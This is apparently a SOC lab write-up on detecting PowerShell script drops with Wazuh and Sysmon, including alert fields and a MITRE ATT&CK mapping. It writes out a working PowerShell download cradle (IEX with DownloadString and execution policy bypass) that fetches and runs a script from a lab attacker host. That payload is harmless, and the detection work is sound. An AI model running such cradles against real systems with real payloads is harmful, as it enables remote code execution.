# SOC  PowerShell Script Drop Detection

## Overview

This lab simulated suspicious PowerShell activity from a Windows 11 endpoint and validated that Wazuh could detect script creation activity through Sysmon telemetry.

The activity generated an alert showing that `powershell.exe` created a `.ps1` file in the user’s temporary directory. Wazuh classified the event as an executable file dropped in a folder commonly abused by malware.

## Lab Environment

| Component          | Description                          |
| ------------------ | ------------------------------------ |
| SIEM               | Wazuh                                |
| Manager            | Ubuntu Server                        |
| Endpoint           | Windows 11 VM                        |
| Endpoint Agent     | Wazuh Agent                          |
| Endpoint Telemetry | Sysmon                               |
| Attacker Machine   | Kali Linux                           |
| Detection Source   | Microsoft-Windows-Sysmon/Operational |

## Objective

The purpose of this lab was to simulate suspicious script activity and confirm that Wazuh could detect endpoint behavior associated with PowerShell script execution, file creation, and possible payload staging.

The specific detection goal was to identify PowerShell creating a script file in a commonly abused temporary directory.

## Simulated Attack Activity

A harmless PowerShell script was created on the Kali machine and hosted with Python’s built-in HTTP server.

### Test Script Created on Kali

```powershell
Write-Output "SOC Lab Test Payload Executed"
```

The script was saved as:

```text
test.ps1
```

### Kali HTTP Server

The Kali machine hosted the script over HTTP using Python:

```bash
python3 -m http.server 8000
```

This started a web server on port `8000`, allowing the Windows VM to retrieve the test script from Kali.

### PowerShell Execution from Windows 11

On the Windows 11 endpoint, PowerShell was used to download and execute the hosted script:

```powershell
powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "IEX (New-Object Net.WebClient).DownloadString('http://192.168.65.133:8000/test.ps1')"
```

This command is commonly referred to as a PowerShell download cradle. In real-world attacks, similar commands may be used to retrieve and execute remote payloads directly in memory.

Important command elements:

```text
-NoProfile
```

Prevents PowerShell from loading the user’s normal PowerShell profile.

```text
-ExecutionPolicy Bypass
```

Attempts to bypass local script execution restrictions for the current PowerShell session.

```text
IEX
```

Alias for `Invoke-Expression`, which executes the downloaded script content.

```text
DownloadString
```

Downloads the remote script content as text.

## Wazuh Alert Evidence

Wazuh generated an alert from Sysmon Event ID `11`, which indicates file creation.

The alert showed that PowerShell created a temporary `.ps1` file:

```text
C:\Users\socla\AppData\Local\Temp\__PSScriptPolicyTest_c0ddkdcx.tml.ps1
```

The process responsible for creating the file was:

```text
C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe
```

Relevant alert fields:

```text
_index: wazuh-alerts-4.x-2026.06.21
agent.name: Windows11PC
agent.ip: 192.168.65.132
data.win.system.channel: Microsoft-Windows-Sysmon/Operational
data.win.system.eventID: 11
data.win.system.providerName: Microsoft-Windows-Sysmon
data.win.eventdata.image: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe
data.win.eventdata.targetFilename: C:\Users\socla\AppData\Local\Temp\__PSScriptPolicyTest_c0ddkdcx.tml.ps1
data.win.eventdata.user: Windows11PC\socla
```

## Detection Explanation

The Wazuh alert was triggered because PowerShell created a `.ps1` file in the user’s temporary directory. Temporary directories are commonly abused by malware and threat actors because they are writable by standard users and frequently used for staging payloads.

The alert was generated from:

```text
Sysmon Event ID 11 - File Created
```

This means Sysmon observed a file creation event and Wazuh applied a detection rule to the activity.

The suspicious file path was:

```text
C:\Users\socla\AppData\Local\Temp\__PSScriptPolicyTest_c0ddkdcx.tml.ps1
```

Although the test script itself was harmless, the behavior is suspicious because PowerShell created a script file in a temporary directory during a command using execution policy bypass behavior.

## Analyst Summary

A PowerShell process created a `.ps1` file in the user’s temporary directory on the Windows 11 endpoint. Sysmon logged the file creation event, and Wazuh generated an alert identifying the behavior as an executable file dropped in a commonly abused malware location.

The activity was generated intentionally as part of a controlled lab. No malicious payload was used. The event demonstrates how endpoint telemetry can detect suspicious PowerShell-related behavior during controlled testing.

## MITRE ATT&CK Mapping

| Tactic              | Technique                     | Description                                        |
| ------------------- | ----------------------------- | -------------------------------------------------- |
| Command and Control | T1105 - Ingress Tool Transfer | Tool or payload transfer into a victim environment |

This alert maps to `T1105 - Ingress Tool Transfer` because the simulated activity involved retrieving a script from a remote system and creating script-related artifacts on the Windows endpoint.

## Result

The lab successfully generated a Wazuh alert from the Windows 11 endpoint.

Confirmed detection details:

```text
Source: Sysmon
Event ID: 11
Event Type: File Created
Process: powershell.exe
Target File: .ps1 file in AppData\Local\Temp
Endpoint: Windows11PC
Detection Platform: Wazuh
```

## Conclusion

This lab demonstrated that Wazuh can detect suspicious endpoint activity associated with PowerShell script creation. The endpoint-based PowerShell test successfully generated a Sysmon-backed Wazuh alert, showing the value of endpoint telemetry for identifying suspicious process and file activity.

Sysmon provided visibility into file creation behavior, while Wazuh correlated the event into a high-value security alert that could be reviewed by a SOC analyst.
